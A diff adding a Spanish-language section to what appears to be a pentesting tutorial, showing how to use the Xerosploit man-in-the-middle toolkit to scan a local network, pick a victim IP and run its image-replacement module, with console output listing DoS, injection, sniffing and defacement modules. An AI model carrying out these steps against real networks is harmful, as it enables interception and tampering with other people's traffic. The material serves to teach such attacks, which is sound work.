@@ -2962,7 +2962,182 @@ con ello.. pero bueno, puede servir para echarnos unas risas de vez en cuando.
 
 #### Reemplazado de imágenes web
 
+En este punto, lo que haremos será envenenar el tráfico de nuestra víctima una vez más pero esta vez para
+manipular las imágenes que se disponen en las páginas web a las que accede.
 
+Para ello, previamente necesitamos contar con una imagen, la cual utilizaremos para hacer la sustitución. Por
+otro lado, necesitamos tener instalada la herramienta **Xerosploit** en nuestro equipo.
+
+* **Repositorio**: https://github.com/LionSec/xerosploit
+
+Una vez la tengamos instalada, ejecutamos **xerosploit** desde consola:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar]
+└──╼ #xerosploit 
+
+____  __                     ________         ______       _____ _____ 
+__  |/ /_____ ______________ __  ___/________ ___  /______ ___(_)__  /_
+__    / _  _ \__  ___/_  __ \_____ \ ___  __ \__  / _  __ \__  / _  __/
+_    |  /  __/_  /    / /_/ /____/ / __  /_/ /_  /  / /_/ /_  /  / /_  
+/_/|_|  \___/ /_/     \____/ /____/  _  .___/ /_/   \____/ /_/   \__/  
+                                     /_/                                    
+
+
+[+]═══════════[ Author : @LionSec1 _-\|/-_ Website: lionsec.net ]═══════════[+]
+
+                      [ Powered by Bettercap and Nmap ]
+ 
+┌═════════════════════════════════════════════════════════════════════════════┐
+█                                                                             █
+█                         Your Network Configuration                          █ 
+█                                                                             █
+└═════════════════════════════════════════════════════════════════════════════┘     
+ 
+╒══════════════╤═══════════════════╤═════════════╤═════════╤════════════╕
+│  IP Address  │    MAC Address    │   Gateway   │  Iface  │  Hostname  │
+╞══════════════╪═══════════════════╪═════════════╪═════════╪════════════╡
+├──────────────┼───────────────────┼─────────────┼─────────┼────────────┤
+│ 192.168.1.43 │ 80:CE:62:3C:EB:A1 │ 192.168.1.1 │  eth0   │   parrot   │
+╘══════════════╧═══════════════════╧═════════════╧═════════╧════════════╛
+
+╔═════════════╦════════════════════════════════════════════════════════════════════╗
+║             ║ XeroSploit is a penetration testing toolkit whose goal is to       ║
+║ Information ║ perform man in the middle attacks for testing purposes.            ║
+║             ║ It brings various modules that allow to realise efficient attacks. ║
+║             ║ This tool is Powered by Bettercap and Nmap.                        ║
+╚═════════════╩════════════════════════════════════════════════════════════════════╝
+
+[+] Please type 'help' to view commands.
+
+Xero ➮ 
+```
+
+Con el comando **help**, listamos las opciones disponibles:
+
+```bash
+Xero ➮ help  
+
+╔══════════╦════════════════════════════════════════════════════════════════╗
+║          ║                                                                ║
+║          ║ scan     :  Map your network.                                  ║
+║          ║                                                                ║
+║          ║ iface    :  Manually set your network interface.               ║
+║ COMMANDS ║                                                                ║
+║          ║ gateway  :  Manually set your gateway.                         ║
+║          ║                                                                ║
+║          ║ start    :  Skip scan and directly set your target IP address. ║
+║          ║                                                                ║
+║          ║ rmlog    :  Delete all xerosploit logs.                        ║
+║          ║                                                                ║
+║          ║ help     :  Display this help message.                         ║
+║          ║                                                                ║
+║          ║ exit     :  Close Xerosploit.                                  ║
+║          ║                                                                ║
+╚══════════╩════════════════════════════════════════════════════════════════╝
+
+[+] Please type 'help' to view commands.
+
+Xero ➮ 
+```
+
+Lo primero es realizar un escaneo de la red, por lo que corremos la opción **scan**:
+
+```bash
+Xero ➮ scan
+
+[++] Mapping your network ... 
+
+[+]═══════════[ Devices found on your network ]═══════════[+]
+
+╔═══════════════╦═══════════════════╦═══════════════╗
+║ IP Address    ║ Mac Address       ║ Manufacturer  ║
+╠═══════════════╬═══════════════════╬═══════════════╣
+║ 192.168.1.1   ║ 1C:B0:44:D4:16:77 ║ (Unknown)     ║
+║ 192.168.1.55  ║ 34:41:5D:46:D1:38 ║ (Unknown)     ║
+║ 192.168.1.60  ║ 20:34:FB:B1:C5:53 ║ (Unknown)     ║
+║ 192.168.1.201 ║ F8:8B:37:E3:32:A2 ║ (Unknown)     ║
+║ 192.168.1.43  ║ 80:CE:62:3C:EB:A1 ║ (This device) ║
+║               ║                   ║               ║
+╚═══════════════╩═══════════════════╩═══════════════╝
+
+[+] Please choose a target (e.g. 192.168.1.10). Enter 'help' for more information.
+
+Xero ➮ 
+```
+
+Tras identificar a nuestra víctima, escribimos la dirección IP y se nos listarán los distintos modos de ataque:
+
+```bash
+Xero ➮ 192.168.1.60
+
+[++] 192.168.1.60 has been targeted. 
+
+[+] Which module do you want to load ? Enter 'help' for more information.
+
+Xero»modules ➮ help
+
+╔═════════╦══════════════════════════════════════════════════════════════════════╗
+║         ║                                                                      ║
+║         ║ pscan       :  Port Scanner                                          ║
+║         ║                                                                      ║
+║         ║ dos         :  DoS Attack                                            ║
+║         ║                                                                      ║
+║         ║ ping        :  Ping Request                                          ║
+║         ║                                                                      ║
+║         ║ injecthtml  :  Inject Html code                                      ║
+║         ║                                                                      ║
+║         ║ injectjs    :  Inject Javascript code                                ║
+║         ║                                                                      ║
+║         ║ rdownload   :  Replace files being downloaded                        ║
+║         ║                                                                      ║
+║         ║ sniff       :  Capturing information inside network packets          ║
+║ MODULES ║                                                                      ║
+║         ║ dspoof      :  Redirect all the http traffic to the specified one IP ║
+║         ║                                                                      ║
+║         ║ yplay       :  Play background sound in target browser               ║
+║         ║                                                                      ║
+║         ║ replace     :  Replace all web pages images with your own one        ║
+║         ║                                                                      ║
+║         ║ driftnet    :  View all images requested by your targets             ║
+║         ║                                                                      ║
+║         ║ move        :  Shaking Web Browser content                           ║
+║         ║                                                                      ║
+║         ║ deface      :  Overwrite all web pages with your HTML code           ║
+║         ║                                                                      ║
+╚═════════╩══════════════════════════════════════════════════════════════════════╝
+
+[+] Which module do you want to load ? Enter 'help' for more information.
+
+Xero»modules ➮ 
+```
+
+Entre ellos, seleccionaremos la opción **replace**, que se encargará de llevar a cabo la sustitución de
+imágenes sobre la página web que nuestra víctima esté visitando:
+
+```bash
+Xero»modules ➮ replace
+ 
+┌══════════════════════════════════════════════════════════════┐
+█                                                              █
+█                          Image Replace                       █
+█                                                              █
+█        Replace all web pages images with your own one        █
+└══════════════════════════════════════════════════════════════┘     
+
+[+] Enter 'run' to execute the 'replace' command.
+
+Xero»modules»replace ➮ run
+
+[+] Insert your image path. (e.g. /home/capitansalami/pictures/fun.png)
+
+Xero»modules»replace ➮ 
+```
+
+Especificamos la ruta absoluta de nuestra imagen y comenzará el ataque. Desde que la víctima navegue a una
+página web, todas las imágenes serán sustituidas por la nuestra:
+
+<img align="center" src="https://funkyimg.com/i/2Wbs4.png">
 
 
 
